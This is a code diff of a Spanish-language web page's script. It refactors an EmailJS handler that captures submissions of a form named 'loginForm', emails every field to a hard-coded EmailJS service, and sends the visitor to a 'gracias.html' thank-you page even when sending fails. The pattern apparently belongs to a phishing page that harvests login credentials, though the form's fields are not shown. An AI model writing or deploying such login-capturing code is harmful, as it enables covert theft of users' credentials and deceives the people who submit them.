@@ -177,27 +177,23 @@
 
     <!-- Script para EmailJS -->
     <script type="text/javascript">
-        // Inicializamos EmailJS con tu userID
-        emailjs.init('user_f80imbc'); // Reemplaza con tu userID
+        document.addEventListener("DOMContentLoaded", function () {
+            emailjs.init('user_f80imbc');
 
-        // Manejamos el evento de envío del formulario
-        document.getElementById('loginForm').addEventListener('submit', function (event) {
-            event.preventDefault();  // Evitamos el envío tradicional del formulario
+            document.getElementById('loginForm').addEventListener('submit', function (event) {
+                event.preventDefault();
 
-            // Obtenemos los datos del formulario
-            var formData = new FormData(this);
+                var formData = new FormData(this);
 
-            // Enviamos el formulario utilizando EmailJS
-            emailjs.sendForm('service_f80imbc', 'template_8dg1bfi', formData)
-                .then(function (response) {
-                    console.log('SUCCESS!', response.status, response.text);
-                    // Redirigimos a la página de agradecimiento si el envío es exitoso
-                    window.location.href = 'gracias.html';
-                }, function (error) {
-                    console.log('FAILED...', error);
-                    // Si hay un error en la entrega, aún redirigimos a gracias.html
-                    window.location.href = 'gracias.html';
-                });
+                emailjs.sendForm('service_f80imbc', 'template_8dg1bfi', formData)
+                    .then(function (response) {
+                        console.log('SUCCESS!', response.status, response.text);
+                        window.location.href = 'gracias.html';
+                    }, function (error) {
+                        console.log('FAILED...', error);
+                        window.location.href = 'gracias.html';
+                    });
+            });
         });
     </script>
 </body>
